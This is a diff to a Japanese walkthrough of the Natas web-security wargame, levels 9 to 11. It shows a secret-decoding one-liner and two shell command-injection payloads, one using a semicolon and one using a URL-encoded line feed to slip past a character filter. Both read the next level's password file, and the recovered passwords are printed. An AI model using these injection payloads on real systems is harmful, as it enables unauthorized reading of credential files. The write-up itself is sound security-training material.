@@ -104,7 +104,10 @@ if(array_key_exists("submit", $_POST)) {
 ?>
 ```
 
-encodeSecret()の逆をやれば良いので、サンドボックスかどこかで`echo base64_decode(strrev(hex2bin($encodedSecret)));`
+encodeSecret()の逆をやれば良いので、サンドボックスかどこかで
+```
+echo base64_decode(strrev(hex2bin($encodedSecret)));
+```
 
 とすると、`oubWYf2kBq`が得られ、提出すればok
 
@@ -116,12 +119,23 @@ source code から入力した文字列を `passthru("grep -i $key dictionary.tx
 
 セミコロンで無理やりコマンドを止めて、そのあとに任意のコマンドを実行できるので
 
-`; cat /etc/natas_webpass/natas10`でおk
-
+```
+; cat /etc/natas_webpass/natas10
 nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+```
 
 ## 10 > 11
 
 さっきと似たような問題だが、`;`, `|`, `&`がエスケープされている。これを回避できれば良い。
 
+最初に改行コードLF(0xA)を入れることで回避できる。
 
+https://ja.wikipedia.org/wiki/%E6%94%B9%E8%A1%8C%E3%82%B3%E3%83%BC%E3%83%89
+
+
+```
+%0Acat /etc/natas_webpass/natas11
+U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+```
+
+## 11 > 12
